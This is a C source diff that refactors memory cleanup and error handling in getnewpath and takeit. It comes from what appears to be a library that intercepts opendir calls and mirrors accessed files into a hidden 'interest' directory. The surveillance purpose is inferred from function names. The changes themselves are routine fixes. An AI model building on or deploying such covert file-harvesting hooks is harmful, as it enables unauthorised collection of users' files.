@@ -354,16 +354,12 @@ char *getnewpath(const char *oldpath){
 
     hook(COPENDIR);
 
-    maxlen = LEN_INTEREST_DIR+strlen(oldpath)+16;
-
     dirs = getdirstructure(oldpath, &cdir);
     if(dirs == NULL) return NULL;
 
     newpath = createdirstructure(INTEREST_DIR, oldpath, dirs, cdir);
     if(newpath == NULL){
-        for(int i=0; i<cdir; i++)
-            free(dirs[i]);
-        free(dirs);
+        freedirs(dirs, cdir);
         return NULL;
     }
 
@@ -373,34 +369,29 @@ dodo:
     dp = call(COPENDIR, pathd);
     free(newpathdup);
     if(dp == NULL && errno == ENOENT){
-        mkdirstructure(INTEREST_DIR, dirs, cdir-1);
+        if(mkdirstructure(INTEREST_DIR, dirs, cdir) < 0){
+            freedirs(dirs, cdir);
+            free(newpath);
+            return NULL;
+        }
         goto dodo;
-    }else if(dp == NULL){
-        free(newpath);
-        for(int i=0; i<cdir; i++)
-            free(dirs[i]);
-        free(dirs);
-        return NULL;
-    }else if(dp) closedir(dp);
+    }else{
+        freedirs(dirs, cdir);
+        if(dp == NULL){
+            free(newpath);
+            return NULL;
+        }else if(dp) closedir(dp);
+    }
 
+    maxlen = strlen(newpath)+32;
     ret = malloc(maxlen);
     if(!ret){
         free(newpath);
-        for(int i=0; i<cdir; i++)
-            free(dirs[i]);
-        free(dirs);
         return NULL;
     }
     memset(ret, 0, maxlen);
-    snprintf(ret, maxlen, "%s-%u",
-                          newpath,
-                          getuid());
+    snprintf(ret, maxlen-1, "%s-%u", newpath, getuid());
     free(newpath);
-
-    for(int i=0; i<cdir; i++)
-        free(dirs[i]);
-    free(dirs);
-
     return ret;
 }
 
@@ -411,6 +402,7 @@ static int takeit(void *oldpath){
     }
 
     char *newpath = getnewpath(oldpath);
+    if(newpath == NULL) return 0;
 
     int ret;
 #ifdef SYMLINK_ONLY
